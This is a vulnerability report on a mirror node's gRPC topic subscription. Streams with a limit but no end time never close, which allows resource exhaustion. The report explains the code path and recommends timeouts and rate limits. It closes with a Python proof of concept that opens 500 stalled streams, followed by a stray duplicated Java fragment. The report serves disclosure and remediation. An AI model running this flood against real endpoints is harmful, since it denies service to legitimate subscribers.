### Title
Unbounded Stream Lifetime via `take(limit)` Without Server-Side Idle Timeout Enables Resource Exhaustion

### Summary
When a subscriber provides a `limit > 0` but omits `endTime`, the `subscribeTopic()` method applies `take(filter.getLimit())` as the sole termination mechanism for the live stream. Because `pastEndTime()` returns `Flux.never()` when `endTime` is null, no server-side timeout or idle-expiry signal is ever emitted. During a network partition (or on any silent topic), the `take()` operator holds the reactive subscription open indefinitely waiting for messages that will never arrive, consuming server-side gRPC/Netty resources for each such connection.

### Finding Description

**Exact code path:**

In `subscribeTopic()` (`TopicMessageServiceImpl.java`):

```
lines 72-73: flux = historical.concatWith(
               Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
lines 83-85: if (filter.hasLimit()) {
               flux = flux.take(filter.getLimit());
             }
```

`takeUntilOther(pastEndTime(topicContext))` is the only designed termination signal for the live portion. `pastEndTime()` (lines 123–131) returns `Flux.never()` when `filter.getEndTime() == null`:

```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();   // ← no termination signal ever emitted
    }
    ...
}
```

`isComplete()` (lines 203–215) also returns `false` unconditionally when `endTime == null`, so the safety check loop never self-terminates either.

**Root cause:** The design assumes that either (a) `endTime` is set (providing a deadline) or (b) messages will eventually arrive to satisfy `take(limit)`. There is no server-enforced idle timeout or maximum subscription duration applied to the live stream. When neither condition holds — as during a network partition — `take(limit)` keeps the upstream subscription alive indefinitely.

**Why the safety check is insufficient:** The `safetyCheck` flux (lines 67–70) fires once after 1 second and calls `missingMessages()` → `topicMessageRetriever.retrieve()`. During a partition this returns an empty flux. The safety check emits nothing and does not cancel or error the parent stream; the stream simply continues waiting.

**Why `maxConcurrentCallsPerConnection = 5` is insufficient:** This limits calls per TCP connection (configured in `GrpcConfiguration.java` line 33), but an attacker can open an unbounded number of TCP connections, each carrying 5 stalled streams.

**Partial mitigation only in nginx-proxied deployments:** The reference `docker-compose.yml` (line 226) sets `grpc_read_timeout 600s`, which closes connections after 600 seconds of no data. This is not enforced by the application itself and is absent in direct-gRPC deployments (Kubernetes without nginx, SDK direct connections, etc.).

### Impact Explanation
Each stalled subscription holds a Netty worker slot, a Reactor scheduler subscription, a live-listener registration (Redis/poll), and associated heap objects. An attacker opening many connections (each with 5 calls, `limit=1`, no `endTime`) on a silent or partitioned topic can exhaust the server's thread pool and memory, causing denial of service for all subscribers. The `subscriberCount` gauge will reflect inflated counts but provides no automatic remediation.

### Likelihood Explanation
No authentication or privilege is required to call `subscribeTopic`. The `TopicMessageFilter` only validates `limit >= 0` and `startTime <= now()`; omitting `endTime` is explicitly allowed. Any public mirror-node endpoint is reachable by an unprivileged external user. The attack is trivially scriptable: open many gRPC connections, each subscribing with `limit=1` and no `endTime` to a valid but silent topic. The attack is repeatable and requires no special knowledge beyond the public gRPC proto definition.

### Recommendation
Apply a server-side maximum stream duration and/or idle timeout directly in the reactive pipeline, independent of `endTime`:

1. **Idle timeout:** Add `.timeout(grpcProperties.getMaxIdleDuration())` to the live flux before `take()`. This terminates the stream with a `TimeoutException` if no message is emitted within the configured window.
2. **Maximum subscription duration:** Add `.take(grpcProperties.getMaxSubscriptionDuration())` (the `Duration`-based overload) as an unconditional upper bound on any subscription lifetime.
3. **Enforce in application, not proxy:** Do not rely solely on the nginx `grpc_read_timeout`; the application must enforce its own limits so that direct-gRPC callers are equally bounded.
4. **Rate-limit new subscriptions per IP/client** at the gRPC interceptor layer to limit the blast radius of connection flooding.

### Proof of Concept

**Preconditions:**
- A valid topic ID exists (e.g., `0.0.1234`) that currently has no new messages (or the network is partitioned).
- The mirror node gRPC port (5600) is reachable directly (bypassing nginx) or nginx `grpc_read_timeout` is not configured.

**Steps:**

```python
import grpc, threading
# proto-generated stubs for ConsensusService
from com.hedera.mirror.api.proto import consensus_pb2, consensus_pb2_grpc

def open_stalled_stream(i):
    channel = grpc.insecure_channel("mirror-node:5600")
    stub = consensus_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_pb2.ConsensusTopicQuery(
        topic_id=...,          # valid topic with no new messages
        limit=1,               # hasLimit() == true, take(1) applied
        # consensusEndTime intentionally omitted → endTime == null
    )
    for _ in stub.subscribeTopic(req):  # blocks indefinitely
        pass

# Open N connections × 5 calls each
for i in range(500):
    threading.Thread(target=open_stalled_stream, args=(i,)).start()
```

**Result:** 500+ gRPC streams remain open indefinitely on the server. Each holds a live-listener registration and Netty resources. Server `hiero.mirror.grpc.subscribers` gauge climbs to 500+.     private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }
